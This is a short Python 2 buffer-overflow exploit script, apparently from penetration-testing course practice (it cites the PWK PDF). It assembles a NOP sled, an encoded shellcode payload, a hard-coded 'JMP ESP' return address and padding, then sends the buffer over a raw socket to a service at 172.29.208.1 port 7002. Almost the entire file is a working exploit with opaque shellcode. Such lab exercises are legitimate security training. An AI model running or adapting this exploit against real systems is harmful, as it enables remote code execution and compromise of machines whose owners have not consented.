#!/usr/bin/python2

# Based off script from PWK pdf (p. 382)

import socket;


buf = "\x90" * 1729
buf += "\xd9\xcd\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\x52\xb8\x26"
buf += "\xce\x05\x4a\x83\xc3\x04\x31\x43\x13\x03\x65\xdd\xe7"
buf += "\xbf\x95\x09\x65\x3f\x65\xca\x0a\xc9\x80\xfb\x0a\xad"
buf += "\xc1\xac\xba\xa5\x87\x40\x30\xeb\x33\xd2\x34\x24\x34"
buf += "\x53\xf2\x12\x7b\x64\xaf\x67\x1a\xe6\xb2\xbb\xfc\xd7"
buf += "\x7c\xce\xfd\x10\x60\x23\xaf\xc9\xee\x96\x5f\x7d\xba"
buf += "\x2a\xd4\xcd\x2a\x2b\x09\x85\x4d\x1a\x9c\x9d\x17\xbc"
buf += "\x1f\x71\x2c\xf5\x07\x96\x09\x4f\xbc\x6c\xe5\x4e\x14"
buf += "\xbd\x06\xfc\x59\x71\xf5\xfc\x9e\xb6\xe6\x8a\xd6\xc4"
buf += "\x9b\x8c\x2d\xb6\x47\x18\xb5\x10\x03\xba\x11\xa0\xc0"
buf += "\x5d\xd2\xae\xad\x2a\xbc\xb2\x30\xfe\xb7\xcf\xb9\x01"
buf += "\x17\x46\xf9\x25\xb3\x02\x59\x47\xe2\xee\x0c\x78\xf4"
buf += "\x50\xf0\xdc\x7f\x7c\xe5\x6c\x22\xe9\xca\x5c\xdc\xe9"
buf += "\x44\xd6\xaf\xdb\xcb\x4c\x27\x50\x83\x4a\xb0\x97\xbe"
buf += "\x2b\x2e\x66\x41\x4c\x67\xad\x15\x1c\x1f\x04\x16\xf7"
buf += "\xdf\xa9\xc3\x58\x8f\x05\xbc\x18\x7f\xe6\x6c\xf1\x95"
buf += "\xe9\x53\xe1\x96\x23\xfc\x88\x6d\xa4\xaf\x50\xb7\xda"
buf += "\xd8\x68\x47\x23\x49\xe4\xa1\x49\x79\xa0\x7a\xe6\xe0"
buf += "\xe9\xf0\x97\xed\x27\x7d\x97\x66\xc4\x82\x56\x8f\xa1"
buf += "\x90\x0f\x7f\xfc\xca\x86\x80\x2a\x62\x44\x12\xb1\x72"
buf += "\x03\x0f\x6e\x25\x44\xe1\x67\xa3\x78\x58\xde\xd1\x80"
buf += "\x3c\x19\x51\x5f\xfd\xa4\x58\x12\xb9\x82\x4a\xea\x42"
buf += "\x8f\x3e\xa2\x14\x59\xe8\x04\xcf\x2b\x42\xdf\xbc\xe5"
buf += "\x02\xa6\x8e\x35\x54\xa7\xda\xc3\xb8\x16\xb3\x95\xc7"
buf += "\x97\x53\x12\xb0\xc5\xc3\xdd\x6b\x4e\xf3\x97\x31\xe7"
buf += "\x9c\x71\xa0\xb5\xc0\x81\x1f\xf9\xfc\x01\x95\x82\xfa"
buf += "\x1a\xdc\x87\x47\x9d\x0d\xfa\xd8\x48\x31\xa9\xd9\x58"
buf += "\x3D\x11\x80\x14" # Address of a "JMP ESP" instruction
buf += "\xFF\xE1" # JMP ECX
buf += "B" * 4 # Likely unnecessary
buf += "C" * 2000 # Likely unnecessary

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("172.29.208.1", 7002))
s.send(buf)

s.close()

print("Done")

